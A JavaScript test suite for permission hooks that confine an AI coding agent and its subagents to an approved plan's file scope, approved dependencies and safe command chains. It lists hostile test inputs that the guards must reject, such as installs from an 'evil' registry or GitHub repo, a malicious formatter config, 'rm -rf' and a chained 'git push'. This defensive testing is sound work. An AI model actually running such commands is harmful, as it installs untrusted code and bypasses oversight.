// v4 policy: execution log, scope extensions, write-mode formatters,
// approved dependencies, shared write policy in guard-bash, subagent chaining.
import { test, after } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import path from 'node:path';
import { runScript, makeRepo, setBranch, writePlan, approve, readState, cleanup } from './helpers.mjs';

const roots = [];
after(() => roots.forEach(cleanup));

function setup({ allowed = ['- `src/engine/emergency/**`', '- `tests/unit/emergency.test.ts`'] } = {}) {
  const root = makeRepo('feat/emergency-ux');
  roots.push(root);
  const plan = writePlan(root, 'emergency-ux', { allowed });
  assert.match(approve(root, 'emergency-ux').stdout, /Approval recorded/);
  for (const f of ['src/engine/emergency/a.ts', 'src/engine/crowd/b.ts', 'src/components/c.tsx', 'tests/unit/emergency.test.ts', 'package.json']) {
    fs.mkdirSync(path.join(root, path.dirname(f)), { recursive: true });
    fs.writeFileSync(path.join(root, f), 'x\n');
  }
  return { root, plan, log: plan.replace(/\.md$/, '.log.md') };
}

const write = (root, rel) =>
  runScript('guard-write.mjs', { hook_event_name: 'PreToolUse', tool_name: 'Write', tool_input: { file_path: path.join(root, rel), content: 'x' }, cwd: root }, { env: { CLAUDE_PROJECT_DIR: root } });
const bash = (root, command) =>
  runScript('guard-bash.mjs', { hook_event_name: 'PreToolUse', tool_name: 'Bash', tool_input: { command }, cwd: root }, { env: { CLAUDE_PROJECT_DIR: root } });
const agent = (root, role, command) =>
  runScript('agent-bash-allowlist.mjs', { hook_event_name: 'PreToolUse', tool_name: 'Bash', tool_input: { command }, cwd: root }, { args: [role], env: { CLAUDE_PROJECT_DIR: root } });
const prompt = (root, p) =>
  runScript('approval-token.mjs', { hook_event_name: 'UserPromptSubmit', prompt: p, cwd: root }, { env: { CLAUDE_PROJECT_DIR: root } });

test('execution log is writable only while the plan is approved and on its branch', () => {
  const { root, plan, log } = setup();
  assert.equal(write(root, log).status, 0);
  assert.equal(write(root, plan).status, 2, 'approved plan stays frozen');
  assert.match(write(root, plan).stderr, /execution log|log\.md/);
  setBranch(root, 'main');
  assert.equal(write(root, log).status, 2);
  setBranch(root, 'feat/emergency-ux');
  prompt(root, 'REVOKE IMPLEMENTATION emergency-ux');
  assert.equal(write(root, log).status, 2);
});

test('scope extensions in the log widen the scope inside src/, tests/, doc/ and public/ only', () => {
  const { root, log } = setup();
  assert.equal(write(root, 'src/components/c.tsx').status, 2);
  fs.writeFileSync(
    path.join(root, log),
    [
      '# Execution log',
      '## Decisions',
      '- `src/components/**`: this line is in Decisions and must not count',
      '## Scope extensions',
      '- `src/components/c.tsx`: the panel must show the new dispatch state',
      '- `package.json`: should be ignored',
      '- `src/**`: too broad, ignored',
      '- `vite.config.ts`: root config, ignored',
      '- `src/engine/crowd/b.ts`',
      '',
    ].join('\n'),
  );
  assert.equal(write(root, 'src/components/c.tsx').status, 0);
  assert.equal(write(root, 'package.json').status, 2);
  assert.equal(write(root, 'src/components/other.tsx').status, 2);
  assert.equal(write(root, 'src/engine/crowd/b.ts').status, 2, 'extension without a reason is ignored');
});

test('guard-bash applies the same write policy to shell writes', () => {
  const { root } = setup();
  assert.equal(bash(root, 'cp src/engine/crowd/b.ts src/engine/emergency/copy.ts').status, 0);
  assert.equal(bash(root, 'cp src/engine/emergency/a.ts src/components/c.tsx').status, 2);
  assert.equal(bash(root, 'rm src/engine/emergency/a.ts').status, 0);
  assert.equal(bash(root, 'rm -rf src/engine').status, 2);
  assert.equal(bash(root, 'mkdir -p src/engine/emergency/new').status, 0);
  assert.equal(bash(root, 'echo x > src/engine/crowd/b.ts').status, 2);
  assert.equal(bash(root, 'echo x > dist/a.txt').status, 0);
});

test('lead formatters write only explicit files inside the scope', () => {
  const { root } = setup();
  assert.equal(bash(root, 'npx prettier --write src/engine/emergency/a.ts tests/unit/emergency.test.ts').status, 0);
  assert.equal(bash(root, 'npx eslint --fix src/engine/emergency/a.ts').status, 0);
  assert.equal(bash(root, 'npx prettier --write src/components/c.tsx').status, 2);
  assert.equal(bash(root, 'npx prettier --write src/engine/emergency').status, 2);
  assert.equal(bash(root, 'npx eslint --fix src/engine/emergency/*.ts').status, 2);
  assert.equal(bash(root, 'npx prettier --write --config evil.js src/engine/emergency/a.ts').status, 2);
});

test('subagent formatters follow role and scope', () => {
  const { root } = setup();
  assert.equal(agent(root, 'implementer', 'npx prettier --write src/engine/emergency/a.ts').status, 0);
  assert.equal(agent(root, 'implementer', 'npx eslint --fix src/engine/emergency/a.ts && npx eslint src/engine/emergency/a.ts').status, 0);
  assert.equal(agent(root, 'implementer', 'npx prettier --write src/components/c.tsx').status, 2);
  assert.equal(agent(root, 'qa', 'npx prettier --write tests/unit/emergency.test.ts').status, 0);
  assert.equal(agent(root, 'qa', 'npx prettier --write src/engine/emergency/a.ts').status, 2);
  assert.equal(agent(root, 'reviewer', 'npx prettier --write src/engine/emergency/a.ts').status, 2);
});

test('dependency tokens are recorded and revoked', () => {
  const { root } = setup();
  assert.match(prompt(root, 'APPROVE DEPENDENCY @turf/area@^7.1.0').stdout, /Dependency approved/);
  assert.match(prompt(root, 'APPROVE DEPENDENCY left-pad').stdout, /any version/);
  assert.match(prompt(root, 'APPROVE DEPENDENCY https://evil/x.tgz').stdout, /NOT recorded/);
  assert.deepEqual(Object.keys(readState(root).dependencies).sort(), ['@turf/area', 'left-pad']);
  assert.match(prompt(root, 'REVOKE DEPENDENCY left-pad').stdout, /REVOKED/);
  assert.deepEqual(Object.keys(readState(root).dependencies), ['@turf/area']);
  assert.match(prompt(root, 'please APPROVE DEPENDENCY x').stdout, /^$/);
});

test('npm install only for approved dependencies on an approved branch', () => {
  const { root } = setup();
  prompt(root, 'APPROVE DEPENDENCY @turf/area@^7.1.0');
  prompt(root, 'APPROVE DEPENDENCY left-pad');
  assert.equal(bash(root, 'npm install @turf/area@^7.1.0').status, 0);
  assert.equal(bash(root, 'npm install -D --save-exact left-pad@1.3.0').status, 0);
  assert.equal(bash(root, 'npm install @turf/area').status, 2, 'version pinned at approval');
  assert.equal(bash(root, 'npm install lodash').status, 2);
  assert.equal(bash(root, 'npm install left-pad --registry=https://evil').status, 2);
  assert.equal(bash(root, 'npm install github:evil/left-pad').status, 2);
  assert.equal(bash(root, 'npm install').status, 2);
  assert.equal(agent(root, 'implementer', 'npm install left-pad').status, 2, 'subagents never install');
  setBranch(root, 'main');
  assert.equal(bash(root, 'npm install left-pad').status, 2);
});

test('v5.1: npm --prefix server installs only approved dependencies, from the root, on an approved branch', () => {
  const { root } = setup();
  prompt(root, 'APPROVE DEPENDENCY left-pad');
  assert.equal(bash(root, 'npm --prefix server install left-pad').status, 0);
  assert.equal(bash(root, 'npm --prefix=server install -D --save-exact left-pad@1.3.0').status, 0);
  assert.equal(bash(root, 'npm --prefix server ci').status, 0);
  assert.equal(bash(root, 'npm --prefix server install lodash').status, 2, 'unapproved dependency');
  assert.equal(bash(root, 'npm --prefix server install').status, 2, 'bare install');
  assert.equal(bash(root, 'npm --prefix server run dev').status, 2, 'scripts are not allowed');
  assert.equal(bash(root, 'npm --prefix server ci --ignore-scripts').status, 2);
  assert.equal(bash(root, 'npm --prefix src install left-pad').status, 2, 'only server/');
  assert.equal(bash(root, 'npm --prefix ../server install left-pad').status, 2);
  assert.equal(bash(root, 'npm --prefix server install left-pad --registry=https://evil').status, 2);
  const sub = path.join(root, 'src');
  const fromSub = runScript(
    'guard-bash.mjs',
    { hook_event_name: 'PreToolUse', tool_name: 'Bash', tool_input: { command: 'npm --prefix server install left-pad' }, cwd: sub },
    { env: { CLAUDE_PROJECT_DIR: root } },
  );
  assert.equal(fromSub.status, 2, 'must run from the repository root');
  assert.equal(agent(root, 'implementer', 'npm --prefix server install left-pad').status, 2, 'subagents never install');
  setBranch(root, 'main');
  assert.equal(bash(root, 'npm --prefix server install left-pad').status, 2, 'not on main');
});

test('subagents may chain allowed commands but not background or write output', () => {
  const { root } = setup();
  assert.equal(agent(root, 'implementer', 'npx tsc --noEmit -p tsconfig.json && npx vitest run tests/unit/emergency.test.ts').status, 0);
  assert.equal(agent(root, 'implementer', 'npm run build 2>&1 | tail -30').status, 0);
  assert.equal(agent(root, 'implementer', 'npm run build &').status, 2);
  assert.equal(agent(root, 'implementer', 'npm run build > build.log').status, 2);
  assert.equal(agent(root, 'implementer', 'ls; git push').status, 2);
});
